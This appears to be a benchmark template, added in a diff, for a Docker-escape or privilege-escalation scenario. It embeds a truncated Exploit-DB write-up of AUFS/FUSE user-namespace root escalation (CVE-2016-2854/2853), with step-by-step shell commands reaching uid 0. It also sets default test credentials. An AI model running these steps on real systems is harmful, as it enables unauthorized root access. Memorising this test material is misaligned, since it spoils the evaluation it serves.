@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41761",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: AUFS (Ubuntu 15.10) - 'allow_userns' Fuse/Xattr User Namespaces Privilege Escalation (CVE-2016-2854;CVE-2016-2853)\n\nExploit source code (41761.txt):\n```\nSource: http://www.halfdog.net/Security/2016/AufsPrivilegeEscalationInUserNamespaces/\n\n## Introduction\n\nProblem description: Aufs is a union filesystem to mix content of different underlying filesystems, e.g. read-only medium with r/w RAM-fs. That is also allowed in user namespaces when module was loaded with allow_userns option. Due to different bugs, aufs in a crafted USERNS allows privilege escalation, which is a problem on systems enabling unprivileged USERNS by default, e.g. Ubuntu Wily. All the issues mentioned here were discovered after performing similar analysis on overlayfs, another USERNS enabled union filesystem.\nFor a system to be exposed, unprivileged USERNS has to be available and AUFS support enabled for it by loading the aufs module with the appropriate option: modprobe aufs allow_userns.\n\n## AUFS Over Fuse: Loss of Nosuid\n\nMethod: Fuse filesystem can be mounted by unprivileged users with the help of the fusermount SUID program. Fuse then can simulate files of any type, mode, UID but they are only visible to the user mounting the filesystem and lose all SUID properties. Those files can be exposed using aufs including the problematic SUID properties. The basic exploitation sequence is:\n\n- Mount fuse filesystem exposing crafted SUID binary\n- Create USERNS\n- Mount aufs on top of fuse\n- Execute the SUID binary via aufs from outside the namespace\n\nThe issue can then be demonstrated using:\n\nSuidExec (http://www.halfdog.net/Misc/Utils/SuidExec.c)\nFuseMinimal (http://www.halfdog.net/Security/2016/AufsPrivilegeEscalationInUserNamespaces/FuseMinimal.c)\nUserNamespaceExec (http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c)\n\ntest$ mkdir fuse mnt work\ntest$ mv SuidExec RealFile\ntest$ ./FuseMinimal fuse\ntest$ ./UserNamespaceExec -- /bin/bash\nroot$ mount -t aufs -o br=work:fuse none mnt\nroot$ cd mnt\n# Now cwd of the former process is within the aufs mount. Use\n# another shell to complete.\ntest$ /proc/2390/cwd/file /bin/bash\nroot$ id\nuid=0(root) gid=100(users) groups=100(users)\n# Go back to old shell for cleanup.\nroot$ cd ..; umount mnt; exit\ntest$ fusermount -u fuse\n\nDiscussion: In my opinion, fuse filesystem allowed pretending to have files with different UIDs/GIDs in the local mount namespace, but they never had those properties, those files would have, when really stored on local disk. So e.g., the SUID binaries lost their SUID-properties and the owner could also modify arbitrary file content, even if file attributes were pretending, that he does not have access - by having control over the fuse process simulating the filesystem, such access control is futile. That is also the reason, why no other user than the one mounting the filesystem may have rights to access it by default.\nIn my optionion the workarounds should be to restrict access to fuse also only to the mount namespace where it was created.\n\n## AUFS Xattr Setgid Privilege Escalation\n\nMethod: Due to inheritance of Posix ACL information (xattrs) when aufs is copying files and not \n```",
+  "cve": "CVE-2016-2854;CVE-2016-2853",
+  "exploitdb_id": "41761",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41761",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
